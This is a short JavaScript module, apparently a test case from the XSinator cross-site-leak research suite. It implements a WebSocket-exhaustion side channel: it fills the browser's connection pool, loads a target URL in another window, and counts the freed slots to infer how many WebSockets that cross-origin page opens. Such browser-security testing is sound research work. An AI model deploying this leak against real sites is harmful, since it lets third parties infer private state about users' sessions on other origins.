// here we go
let SOCKETS = []

const sleep = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const exaustWsLimit = (ws, limit) => {
    for(let id=0; id < limit; id++){
        let s = new WebSocket(ws)
        s.onerror = (e) => {
            SOCKETS = SOCKETS.filter((x) => x !== s)
        }
        SOCKETS.push(s)
    }
}

const killSockets = (n=10) => {
    for(let id=0; id < n; id++){
        SOCKETS.shift().close()

    }
}

const closeAllWs = () => {
    for(let s of SOCKETS){
        s.close()
    }
}



const leak = async(url, waitTime=3000, max=200) => {
    let ws = 'wss://xsinator.com/5sleep' // nonblocking sleep
    exaustWsLimit(ws, max)
    // i think we need this here
    await sleep(500)
    // save amount of sockets
    let pageWsLimit = SOCKETS.length
    // make room
    killSockets(10)
    // open url
    await sleep(500)
    window.WW.location = url
    // wait for WS to connect on url
    await sleep(waitTime)
    // try to add some more
    exaustWsLimit(ws, 10)
    // i think w5 need this here
    await sleep(400)
    // calc difference
    let res = pageWsLimit - SOCKETS.length
    // cleanup
    closeAllWs()
    window.WW.location = 'about:blank'
    await sleep(2000)
    return res
}

export { leak }